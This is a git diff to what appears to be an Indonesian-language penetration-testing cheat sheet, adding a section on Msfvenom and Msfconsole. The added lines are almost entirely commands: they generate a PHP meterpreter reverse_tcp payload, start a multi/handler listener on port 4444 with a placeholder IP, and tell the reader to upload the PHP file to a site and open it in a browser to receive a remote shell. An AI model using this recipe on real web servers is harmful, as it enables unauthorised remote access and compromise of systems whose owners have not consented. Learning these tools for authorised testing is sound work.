@@ -4,6 +4,7 @@
 ### Daftar Isi
 	* [John the Ripper](#john-the-ripper)
 	* [Recon-ng](#reconng)
+	* [Msfvenom & Msfconsole](#msfvenom-msfconsole)
 
 #### John the Ripper
 
@@ -138,4 +139,30 @@ spool start
 spool stop
 ```
 
+#### Msfvenom & Msfconsole
 
+File Upload
+```
+msfvenom -p php/meterpreter/reverse_tcp lhost=IP lport=4444 raw
+```
+Masuk Msfconsole
+```
+msfconsole
+```
+```
+use exploit/multi/handler
+```
+```
+set payload php/meterpreter/reverse_tcp
+```
+```
+set lhost IP
+```
+```
+set lport 4444
+```
+```
+exploit
+```
+
+Masuk Browser jalankan file php yg berhasil di upload tadi di URL
